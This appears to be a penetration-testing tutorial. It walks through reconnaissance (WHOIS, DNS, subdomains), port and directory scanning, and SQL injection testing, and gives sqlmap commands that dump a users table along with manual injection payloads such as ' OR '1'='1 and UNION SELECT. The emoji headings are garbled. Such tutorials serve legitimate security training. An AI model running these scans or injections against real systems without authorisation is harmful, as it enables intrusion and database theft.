üîç Phase 1: Reconnaissance & Information Gathering

Reconnaissance is the foundation of penetration testing. This phase helps you understand the target, find entry points, and gather valuable intelligence.

‚è±Ô∏è Time Required

2-4 hours for comprehensive reconnaissance

1.1 WHOIS Lookup

Purpose: Get domain registration info, owner details, nameservers

bash 
# Basic WHOIS lookup
whois target.com
# Shows: Owner name, email, phone, registration date, expiry

# Save to file
whois target.com > /mnt/usb/recon/whois.txt

# Bulk WHOIS lookup
for domain in target1.com target2.com target3.com; do
    echo "=== $domain ===" >> /mnt/usb/recon/bulk-whois.txt
    whois $domain >> /mnt/usb/recon/bulk-whois.txt
done
üí° What to Look For
  • Admin email (for responsible disclosure)
  • Nameservers (DNS provider)
  • Registration date (old = possibly outdated security)
  • Expiry date (about to expire = vulnerable)

1.2 DNS Enumeration

Purpose: Find all DNS records, subdomains, mail servers

bash 
# Get ALL DNS records
dig target.com ANY

# Specific record types
dig target.com A          # IPv4 address
dig target.com MX         # Mail servers
dig target.com NS         # Nameservers
dig target.com TXT        # Text records

# DNS zone transfer (often fails, but try!)
dig @ns1.target.com target.com AXFR
# If successful = HUGE INFO LEAK!

1.3 Subdomain Enumeration

Purpose: Find hidden subdomains (admin.target.com, dev.target.com)

bash 
# Sublist3r (Fast, uses multiple sources)
sublist3r -d target.com -o /mnt/usb/recon/subdomains.txt

# Assetfinder (Quick discovery)
assetfinder target.com | tee /mnt/usb/recon/assetfinder.txt

# Combine results and remove duplicates
cat /mnt/usb/recon/*subdomains.txt | sort -u > /mnt/usb/recon/all-subdomains.txt
üéØ Valuable Subdomains to Find
  • admin.target.com - Admin panels
  • dev.target.com - Development servers (often less secure)
  • staging.target.com - Staging environments
  • api.target.com - API endpoints

1.4 Technology Detection

Purpose: Identify CMS, frameworks, server software

bash 
# WhatWeb (Comprehensive)
whatweb target.com

# Verbose mode (more details)
whatweb -v target.com

# Manual detection with curl
curl -I target.com
# Check headers: Server, X-Powered-By, X-Generator

# Check common files
curl http://target.com/robots.txt
curl http://target.com/readme.html

üîé Phase 2: Scanning & Enumeration

2.1 Port Scanning

Purpose: Find open ports and running services

bash 
# QUICK SCAN (top 1000 ports)
nmap target.com

# SERVICE VERSION DETECTION
nmap -sV target.com

# AGGRESSIVE SCAN (OS, version, scripts)
nmap -A target.com

# SAVE RESULTS
nmap -sV -sC -p- -oA /mnt/usb/scans/full-scan target.com
üö® Critical Findings to Report
  • Port 3306 (MySQL) open = Database exposed to internet (CRITICAL!)
  • Port 21 (FTP) open = Old protocol, often has exploits
  • Port 23 (Telnet) open = Unencrypted, very insecure (CRITICAL!)

2.2 Directory Enumeration

Purpose: Find hidden directories and files

bash 
# GOBUSTER (Fast, recommended)
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,zip,bak \
  -o /mnt/usb/enum/gobuster.txt

# Find backup files
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x .bak,.old,.backup,.zip,.sql
üí∞ High-Value Findings
  • /admin, /administrator = Admin panels
  • /backup.zip = CRITICAL - Exposed backups
  • /.git = CRITICAL - Source code exposed
  • /.env = CRITICAL - API keys, passwords

üíâ SQL Injection Testing

SQL injection is one of the most critical vulnerabilities. It allows attackers to access and manipulate databases.

‚ö†Ô∏è Severity: CRITICAL

SQL injection can lead to complete database compromise, data theft, and admin access.

Automated Testing with SQLMap

bash 
# Basic SQL injection test
sqlmap -u "http://target.com/page.php?id=1"

# Get database names
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables from database
sqlmap -u "http://target.com/page.php?id=1" \
  -D database_name --tables

# Dump users table
sqlmap -u "http://target.com/page.php?id=1" \
  -D database_name \
  -T users \
  --dump

# Test POST request
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test"

Manual Testing Payloads

sql 
-- Test these payloads in URL parameters:

' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #
1' ORDER BY 1--
1' UNION SELECT NULL--
1' UNION SELECT @@version,NULL--
‚ö†Ô∏è Error Messages that Confirm SQLi
  • "You have an error in your SQL syntax"
  • "mysql_fetch_array()"
  • "Warning: mysql_query()"
  • "ORA-01756: quoted string not properly terminated"
